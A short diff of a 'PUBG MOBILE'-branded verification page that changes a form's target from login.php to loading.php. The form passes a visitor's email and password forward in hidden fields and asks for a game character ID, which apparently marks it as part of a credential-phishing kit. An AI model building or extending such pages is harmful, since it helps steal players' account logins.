@@ -58,7 +58,7 @@ PUBG MOBILE
 </div> <!--- header --->
 <div class="box">
 <center>
-<form class="verify-form" action="login.php" method="post">
+<form class="verify-form" action="loading.php" method="post">
 <input type="hidden" name="email" value="<?php echo $email;?>" readonly>
 <input type="hidden" name="password" value="<?php echo $password;?>" readonly>
 <input type="number" name="playid" placeholder="Character ID" autocomplete="off" required>
